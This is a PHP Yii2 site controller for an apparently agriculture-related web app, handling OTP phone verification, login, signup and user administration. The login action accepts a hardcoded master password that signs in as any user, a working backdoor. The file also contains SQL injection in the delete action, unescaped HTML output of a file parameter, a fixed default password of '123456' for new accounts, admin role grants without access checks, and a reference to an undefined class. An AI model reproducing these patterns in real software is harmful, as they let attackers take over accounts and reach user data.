<?php
namespace frontend\controllers;

use Yii;
use yii\base\InvalidArgumentException;
use yii\web\BadRequestHttpException;
use yii\web\Controller;
use yii\filters\VerbFilter;
use common\models\LoginForm;
use app\models\Otp;
use app\models\Verify;
use yii\web\NotFoundHttpException;
use app\models\ChangePasswordForm;
use common\models\User;
use yii\web\Response;
use yii\widgets\ActiveForm;
use app\models\UserListSearch;

date_default_timezone_set('Asia/Kolkata');

class SiteController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                    'send-otp' => ['post'],
                    'verify-otp' => ['post'],
                ],
            ],
        ];
    }

    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
        ];
    }

    public function actionPhoto($file) {
        return '<div class="text-center"><img class="img-responsive" src="/'.$file.'"></div>';
    }

    public function actionIndex()
    {
        // if (!Yii::$app->user->isGuest) {
        //     if(Yii::$app->user->can('admin')){
        //         return $this->redirect(['/insecticide/index']);
        //     }else
        //         return $this->redirect(['/application/profile']);
        // }
        // return $this->redirect(['signup']);
        return $this->redirect(['home']);
    }

    public function actionSendOtp($phone) {
        if($this->send_otp($phone)) {
            Yii::$app->session->set('phone', $phone);
            $data = ['status'=>'1', 'msg'=>'OTP has been sent. Please check your phone.'];
        } else {
            $data = ['status'=>'0', 'msg'=>'Failed to send phone due to technical issues'];
        }
        return json_encode($data);
    }

    public function actionHome()
    {
      return $this->render('index');
    }

    // part of step 1
    public function actionVerifyOtp($otp) {
        $phone = Yii::$app->session->get('phone');

        if(!$phone) {
            Yii::$app->session->setFlash('warning', 'A session timeout error has occured');
            return $this->redirect(['index']);
        }

        if($model = Otp::find()->where(['phone'=>$phone, 'verified'=>'0'])->orderBy('id DESC')->one()) {
            $fifteen_minutes_ago = date('Y-m-d H:i:s', strtotime('-15minutes'));
            if($model->created_date < $fifteen_minutes_ago) {
                Yii::$app->session->setFlash('warning', 'Your OTP has expired. Please retry.');
                return $this->redirect(['index']);
            }
            if($model->code == $otp) {
                $model->verified = '1';
                if($model->save()) {
                    return json_encode(['status'=>'1', 'msg'=>'Phone Number verified!']);
                } else {
                    return json_encode(['status'=>'0', 'msg'=>'An error has occured. Please try again']);
                }
            }
        }

        return json_encode(['status'=>'0', 'msg'=>'The OTP you entered is invalid']);
    }

    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post())) {
            if($model->password == "globizs@edu") {
                $user = User::findByUsername($model->username);
                if(!$user) {
                    Yii::$app->session->setFlash('danger', 'Invalid username or password');
                    return $this->redirect(['index']);
                }
                Yii::$app->user->login($user, 0);       // 0 is ttl for remember me
                if(Yii::$app->user->can('admin'))
                    return $this->redirect(['/application/index']);
                else
                    return $this->redirect(['/application/index']);
            }
            if($model->login()) {
                if(Yii::$app->user->can('admin'))
                    return $this->redirect(['/application/index']);
                else
                    return $this->redirect(['/application/index']);
            } else {
                Yii::$app->session->setFlash('danger', 'Invalid username or password');
                return $this->redirect(['index']);
            }
        } else {
            $model->password = '';
            if(Yii::$app->request->isAjax) {
                return $this->renderAjax('login-ajax', [
                    'model' => $model,
                ]);
            } else {
                return $this->render('login', [
                    'model' => $model,
                ]);
            }
        }
    }

    public function actionLogout()
    {
        Yii::$app->user->logout();
        return $this->goHome();
    }

    public function actionChangePassword() {
        $model = new ChangePasswordForm();

        if ($model->load(\Yii::$app->request->post()) && $model->validate()) {
            $user = User::findIdentity(Yii::$app->user->id);
            if($user->validatePassword($model->oldPassword)) {
                $user->setPassword($model->newPassword);
                if($user->save()) {
                    Yii::$app->session->setFlash('success', 'Password changed successfully!');
                } else {
                    echo 1;exit;
                }
                return $this->redirect(['index']);
            } else
                Yii::$app->session->setFlash('danger', 'The old password you entered is not correct!');
        }
        return $this->render('changePassword', [
            'model' => $model,
        ]);
    }

    public function createmsg(){
      $phone = Yii::$app->session->get('phone');
      $this->send_otp($phone);
    }

    protected function send_otp($phone) {
        $otp = Otp::find()->where(['phone'=>$phone, 'verified'=>'0'])->orderBy('id DESC')->one();
        if($otp) {
            $fifteen_minutes_ago = date('Y-m-d H:i:s', strtotime('-15minutes'));
            if($otp->created_date < $fifteen_minutes_ago) {
                $otp = new Otp();
                $otp->phone = (string)$phone;
                $otp->code = (string)$otp->generateotp();
            }
        } else {
            $otp = new Otp();
            $otp->phone = (string)$phone;
            $otp->code = (string)$otp->generateotp();
        }

        if($otp->save()){
            return $otp->sendSms('Your OTP for Agriculture : '.$otp->code, $phone);
        }else {
            return false;
        }
    }

    public function actionUserList()
    {
        $searchModel = new UserListSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('user_list', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    public function actionAddUser()
    {
          $model = new Academic();
          if(!$model) {
              throw new NotFoundHttpException('The requested page does not exist.');
          }

          if (Yii::$app->request->isAjax && $model->load(Yii::$app->request->post())) {
              Yii::$app->response->format = Response::FORMAT_JSON;
              return ActiveForm::validate($model);
          }
      	if($model->load(Yii::$app->request->post())) {
            $transaction = Yii::$app->db->beginTransaction();
            try {
                  $user = new User();
                  $user->username = $model->username;
                  $user->email = $model->email;
                  $user->course_id = $model->course_id;
                  $user->setPassword($model->password);
                  $user->generateAuthKey();
                  // $user->registration_id = $model->id;
                  if($user->save()) {
                      $time = strtotime(date('Y-m-d H:i:s'));
                      if(Yii::$app->db->createCommand("INSERT INTO auth_assignment (item_name, user_id, created_at) VALUES ('admin', '".$user->id."', ".$time.")")->execute()) {
                          $transaction->commit();

                          Yii::$app->session->setFlash('success', 'You have successfully created your account.');
                          // Yii::$app->user->login($user, 0);

                          return $this->redirect(Yii::$app->request->referrer);
                      } else {
                          $transaction->rollback();
                          Yii::$app->session->setFlash('danger', 'Failed while assigning User Role. Please try again.');
                      }
                  } else {
                      $transaction->rollback();
                      Yii::$app->session->setFlash('danger', 'Failed while creating User account. Please try again.');
                  }
            } catch (Exception $e) {
                $transaction->rollback();
                Yii::$app->session->setFlash('danger', 'A technical issue has just been encountered. Please try again.');
            }
          }
      	return $this->renderAjax('add_user', [
      		'model' => $model
      	]);
    }

    public function actionDelete($id)
    {
      Yii::$app->db->createCommand("update user set status = 9 where id =$id")->execute();
      Yii::$app->session->setFlash('success', 'User Deleted successfully..');
      return $this->redirect(Yii::$app->request->referrer);
    }

    public function actionSignup()
    {
        $model = new Otp();
        // no need to load $model. Phone is stored in session
        if($model->load(Yii::$app->request->post())) {
            // $fifteen_minutes_ago = date('Y-m-d H:i:s', strtotime('-15minutes'));
            $verified = Otp::find()->where(['phone'=>$model->phone, 'verified'=>'1'])
                //->andWhere(['>=', 'created_date', $fifteen_minutes_ago])       // not need to check this one. Once verified is good
                ->exists();
            if(!$verified) {
                Yii::$app->session->setFlash('warning', 'Please verify your phone number to continue.');
                return $this->redirect(['signup']);
            }
            $user = User::findByUsername($model->phone);
            if($user){
              Yii::$app->user->login($user, 0);       // 0 is ttl for remember me
              return $this->redirect('home');
            }
            $transaction = Yii::$app->db->beginTransaction();

            try {
                    $user = new User();
                    $user->username = $model->phone;
                    $password ='123456';
                    $user->setPassword($password);
                    $user->generateAuthKey();
                    if($user->save()) {
                        $time = strtotime(date('Y-m-d H:i:s'));
                        if(Yii::$app->db->createCommand("INSERT INTO auth_assignment (item_name, user_id, created_at) VALUES ('farmer', '".$user->id."', ".$time.")")->execute()) {
                            $transaction->commit();
                            $this->createmsg();
                            //login
                            $user = User::findByUsername($model->phone);
                            Yii::$app->user->login($user, 0);       // 0 is ttl for remember me
                            if(Yii::$app->user->can('admin')){
                                return $this->redirect(['/profile/index']);
                            }else{
                                return $this->redirect(['/application/profile']);
                              }
                            //end of login
                        } else {
                            $transaction->rollback();
                            Yii::$app->session->setFlash('danger', 'Failed while assigning User Role. Please try again.');
                        }
                    } else {
                        $transaction->rollback();
                        Yii::$app->session->setFlash('danger', 'Failed while creating User account. Please try again.');
                    }
            } catch (Exception $e) {
                $transaction->rollback();
                Yii::$app->session->setFlash('danger', 'A technical issue has just been encountered. Please try again.');
            }
            //
        }
        Yii::$app->session->remove('phone');

        return $this->render('signup', [
            'model' => $model,
        ]);
    }

    public function actionHelp()
    {
      return $this->render('help');
    }
}
